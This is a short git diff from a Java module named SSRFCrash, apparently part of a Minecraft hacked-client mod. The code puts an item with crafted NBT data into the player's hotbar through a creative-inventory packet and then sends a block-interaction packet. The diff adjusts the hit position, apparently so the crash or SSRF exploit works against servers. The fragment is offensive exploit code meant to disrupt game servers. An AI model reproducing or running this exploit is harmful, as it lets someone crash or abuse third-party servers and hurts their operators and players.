@@ -49,7 +49,7 @@ public class SSRFCrash extends Module {
             krash.setNbt(kompound);
             client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + client.player.getInventory().selectedSlot, krash));
             try {
-                client.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0, 0, 0), Direction.UP, client.player.getBlockPos(), true)));
+                client.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(client.player.getPos(), Direction.UP, client.player.getBlockPos(), true)));
             } catch (Exception ignored) {
             }
         }
